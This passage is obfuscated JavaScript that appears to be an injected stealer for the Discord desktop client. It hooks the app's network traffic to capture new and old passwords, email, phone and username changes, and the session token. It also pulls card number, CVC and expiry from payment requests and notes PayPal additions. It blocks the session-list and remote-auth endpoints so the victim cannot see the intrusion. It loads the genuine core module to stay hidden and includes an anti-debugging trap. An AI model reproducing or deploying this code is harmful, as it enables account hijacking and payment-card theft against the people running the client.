              _0x1e9f48.new_password,
              _0x1e9f48.password,
              _0x471368.token
            )
          }
          _0x1e9f48.phone &&
            PhoneChanged(_0x1e9f48.phone, _0x1e9f48.phone, _0x471368.token)
          _0x1e9f48.username &&
            UsernameChanged(
              _0x1e9f48.username,
              _0x1e9f48.username,
              _0x471368.token
            )
          break
        case _0x5ac8af.response.url.endsWith('/email'):
          _0x1e9f48.email &&
            EmailChanged(_0x1e9f48.email, _0x1e9f48.email, await getToken())
          break
        case _0x5ac8af.response.url.endsWith('/password'):
          _0x1e9f48.new_password &&
            PasswordChanged(
              _0x1e9f48.new_password,
              _0x1e9f48.password,
              await getToken()
            )
          break
        case _0x5ac8af.response.url.endsWith('/phone'):
          _0x1e9f48.phone &&
            PhoneChanged(_0x1e9f48.phone, _0x1e9f48.phone, await getToken())
          break
        case _0x5ac8af.response.url.endsWith('/username'):
          if (_0x1e9f48.username) {
            UsernameChanged(
              _0x1e9f48.username,
              _0x1e9f48.username,
              await getToken()
            )
          }
          break
        case _0x5ac8af.response.url.endsWith('/subscriptions'):
          _0x471368.subscription && NitroPurchased(await getToken())
          break
      }
    }
  )
  mainWindow.webContents.debugger.sendCommand('Network.enable')
  mainWindow.on('closed', () => {
    createWindow()
  })
}
createWindow()
session.defaultSession.webRequest.onCompleted(
  CONFIG.payment_filters,
  async (_0x4dc964, _0x2fc6c7) => {
    if (![200, 202].includes(_0x4dc964.statusCode)) {
      return
    }
    if (_0x4dc964.method != 'POST') {
      return
    }
    switch (true) {
      case _0x4dc964.url.endsWith('tokens'):
        const _0x1d8980 = querystring.parse(
          Buffer.from(_0x4dc964.uploadData[0].bytes).toString()
        )
        CreditCardAdded(
          _0x1d8980['card[number]'],
          _0x1d8980['card[cvc]'],
          _0x1d8980['card[exp_month]'],
          _0x1d8980['card[exp_year]'],
          await getToken()
        )
        break
      case _0x4dc964.url.endsWith('paypal_accounts'):
        PaypalAdded(await getToken())
        break
    }
  }
)
session.defaultSession.webRequest.onBeforeRequest(
  CONFIG.filters2,
  (_0x55a0e9, _0x54c331) => {
    const _0x2debdb = { cancel: true }
    if (
      _0x55a0e9.url.startsWith('wss://remote-auth-gateway') ||
      _0x55a0e9.url.endsWith('auth/sessions')
    ) {
      return _0x54c331(_0x2debdb)
    }
  }
)
module.exports = require('./core.asar')
function _0x30c890(_0x1850af) {
  function _0x94afd2(_0x4477d1) {
    if (typeof _0x4477d1 === 'string') {
      return function (_0x1be744) {}
        .constructor('while (true) {}')
        .apply('counter')
    } else {
      ;('' + _0x4477d1 / _0x4477d1).length !== 1 || _0x4477d1 % 20 === 0
        ? function () {
            return true
          }
            .constructor('debugger')
            .call('action')
        : function () {
            return false
          }
            .constructor('debugger')
            .apply('stateObject')
    }
    _0x94afd2(++_0x4477d1)
  }
  try {
    if (_0x1850af) {
      return _0x94afd2
    } else {
      _0x94afd2(0)
    }
  } catch (_0x308977) {}
}
